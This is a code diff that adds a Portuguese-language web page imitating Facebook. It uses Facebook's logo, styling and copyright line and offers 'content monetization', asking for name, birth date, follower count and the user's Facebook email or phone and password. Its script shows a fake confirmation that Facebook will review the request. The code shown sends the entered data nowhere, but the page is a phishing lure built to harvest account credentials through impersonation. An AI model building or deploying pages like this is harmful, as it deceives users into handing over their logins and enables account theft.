@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Monetização de Conteúdo - Facebook</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f0f2f5;
+        }
+        
+        .header {
+            background-color: #1877f2;
+            padding: 20px 0;
+            text-align: center;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+        
+        .logo {
+            height: 34px;
+            width: auto;
+        }
+        
+        .container {
+            max-width: 800px;
+            margin: 30px auto;
+            padding: 20px;
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+        
+        h1 {
+            color: #1877f2;
+            text-align: center;
+        }
+        
+        .form-group {
+            margin-bottom: 15px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+            color: #1c1e21;
+        }
+        
+        input[type="text"],
+        input[type="date"],
+        input[type="number"],
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+        
+        .login-section {
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #dddfe2;
+        }
+        
+        .login-title {
+            text-align: center;
+            color: #1877f2;
+            margin-bottom: 20px;
+        }
+        
+        .submit-button {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 12px;
+            font-size: 16px;
+            font-weight: bold;
+            width: 100%;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        
+        .submit-button:hover {
+            background-color: #166fe5;
+        }
+        
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            padding: 20px;
+            color: #65676b;
+            font-size: 14px;
+        }
+        
+        .message {
+            text-align: center;
+            margin-top: 20px;
+            padding: 10px;
+            border-radius: 6px;
+            font-weight: bold;
+        }
+        
+        .error {
+            background-color: #ffecec;
+            color: #cc0000;
+            border: 1px solid #cc0000;
+        }
+        
+        .success {
+            background-color: #e8f5e9;
+            color: #2e7d32;
+            border: 1px solid #2e7d32;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/51/Facebook_f_logo_%282019%29.svg/1200px-Facebook_f_logo_%282019%29.svg.png" alt="Facebook Logo" class="logo">
+    </div>
+    
+    <div class="container">
+        <h1>Monetização de Conteúdo no Facebook</h1>
+        
+        <form id="monetizacaoForm">
+            <div class="form-group">
+                <label for="nome">Nome Completo:</label>
+                <input type="text" id="nome" name="nome" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="nascimento">Data de Nascimento:</label>
+                <input type="date" id="nascimento" name="nascimento" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="seguidores">Número de Seguidores:</label>
+                <input type="number" id="seguidores" name="seguidores" required>
+            </div>
+            
+            <div class="login-section">
+                <h3 class="login-title">Login com Facebook</h3>
+                
+                <div class="form-group">
+                    <label for="email">Email ou Telefone:</label>
+                    <input type="text" id="email" name="email" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="senha">Senha:</label>
+                    <input type="password" id="senha" name="senha" required>
+                </div>
+            </div>
+            
+            <div id="message" class="message" style="display: none;"></div>
+            
+            <button type="submit" class="submit-button">Login e Enviar Formulário</button>
+        </form>
+    </div>
+    
+    <div class="footer">
+        <p>© 2023 Facebook. Todos os direitos reservados.</p>
+    </div>
+
+    <script>
+        document.getElementById('monetizacaoForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const nome = document.getElementById('nome').value;
+            const nascimento = document.getElementById('nascimento').value;
+            const seguidores = document.getElementById('seguidores').value;
+            const emailOuTelefone = document.getElementById('email').value;
+            const senha = document.getElementById('senha').value;
+            const messageDiv = document.getElementById('message');
+            
+            // Validação para email ou telefone
+            const isEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailOuTelefone);
+            const isTelefone = /^[\d\s\(\)\-]+$/.test(emailOuTelefone);
+            
+            if (!nome || !nascimento || !seguidores || !emailOuTelefone || !senha) {
+                messageDiv.textContent = "Por favor, preencha todos os campos incluindo login com Facebook";
+                messageDiv.className = "message error";
+                messageDiv.style.display = "block";
+            } else if (!isEmail && !isTelefone) {
+                messageDiv.textContent = "Por favor, insira um email válido ou número de telefone";
+                messageDiv.className = "message error";
+                messageDiv.style.display = "block";
+            } else {
+                messageDiv.textContent = "Monetização enviada! Aguarde 24 horas para o time do Facebook analisar sua solicitação.";
+                messageDiv.className = "message success";
+                messageDiv.style.display = "block";
+                
+                document.getElementById('monetizacaoForm').reset();
+                
+                setTimeout(() => {
+                    messageDiv.style.display = "none";
+                }, 5000);
+            }
+        });
+    </script>
+</body>
+</html>
